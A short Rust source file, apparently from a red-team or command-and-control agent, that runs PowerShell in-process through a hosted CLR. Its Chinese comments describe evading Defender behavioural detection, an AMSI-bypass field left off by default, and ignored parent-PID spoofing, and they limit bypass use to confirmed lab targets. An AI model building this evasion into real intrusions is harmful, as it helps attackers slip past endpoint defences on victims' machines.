//! PowerShell inline execution entry.
//!
//! 默认执行方式（powershell-inline）：agent 进程内托管 CLR 4 + GAC 中的
//! System.Management.Automation，无 powershell.exe 进程、无内存补丁，
//! 对 Defender 行为检测不可见。
//!
//! 兼容参数（向后兼容，不影响 inline 语义）：
//!   amsiBypass — 保留字段但默认不生效；inline 模式下不做任何系统 DLL 内存
//!   改写（写内存补丁正是行为检测告警点）。需要绕过 AMSI 时必须在已确认
//!   环境的靶机/隔离 VM 上另行启用专项绕过模块。
//!   parentPid — inline 模式无子进程，字段忽略。

use crate::clr_host;

pub struct PowerShellRunner;

impl PowerShellRunner {
    /// Execute PowerShell script in-process via the hosted CLR.
    pub fn execute(script: &str, timeout_secs: u64) -> String {
        clr_host::execute_inline(script, timeout_secs)
    }
}
